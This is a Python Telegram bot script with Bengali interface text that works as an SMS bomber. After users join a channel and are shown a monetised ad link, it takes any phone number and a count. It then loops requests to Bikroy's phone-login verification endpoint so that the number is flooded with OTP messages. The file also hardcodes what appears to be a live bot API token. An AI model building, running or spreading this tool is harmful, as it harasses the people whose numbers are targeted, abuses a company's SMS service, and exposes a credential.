import telebot
import requests
import time
from telebot import types

# আপনার সেটিংস
API_TOKEN = '8678067992:AAEDkPkmtuz86YnrMJcnIVcp19tL52tkyRk'
CHANNEL_USERNAME = '@developer_of_maruf' 
# নিচের লিংকের জায়গায় আপনার GPLinks থেকে পাওয়া শর্ট লিংকটি বসাবেন
GPLINK_AD = "https://gplinks.co/YourLink" 

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

def check_join(chat_id):
    try:
        status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def welcome(message):
    if check_join(message.chat.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("💰 টাকা ইনকাম করুন (ক্লিক)", url=GPLINK_AD))
        msg = bot.send_message(message.chat.id, "✅ ভেরিফিকেশন সফল!\nএখন SMS পাঠাতে আপনার নাম্বারটি লিখুন:", reply_markup=markup)
        bot.register_next_step_handler(msg, get_number)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/developer_of_maruf"))
        markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify"))
        bot.send_message(message.chat.id, "❌ বোটটি ব্যবহার করতে আগে চ্যানেলে জয়েন করুন!", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    if check_join(call.message.chat.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "✅ সফল! এখন আপনার নাম্বারটি লিখুন:")
        bot.register_next_step_handler(call.message, get_number)
    else:
        bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন হননি!", show_alert=True)

def get_number(message):
    if not message.text or not message.text.isdigit() or len(message.text) < 11:
        msg = bot.reply_to(message, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
    user_data[message.chat.id] = {'number': message.text}
    msg = bot.reply_to(message, "🔢 কতটি SMS পাঠাতে চান?")
    bot.register_next_step_handler(msg, get_amount)

def get_amount(message):
    try:
        amount = int(message.text)
        num = user_data[message.chat.id]['number']
        bot.send_message(message.chat.id, f"🚀 {num} এ {amount}টি SMS যাচ্ছে...\n\n📢 স্পন্সর অফার: {GPLINK_AD}")
        for i in range(amount):
            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
        bot.send_message(message.chat.id, "✅ কাজ শেষ! আবার পাঠাতে /start দিন।")
    except: pass

if __name__ == "__main__":
    print("বোট চালু হয়েছে...")
    bot.infinity_polling()
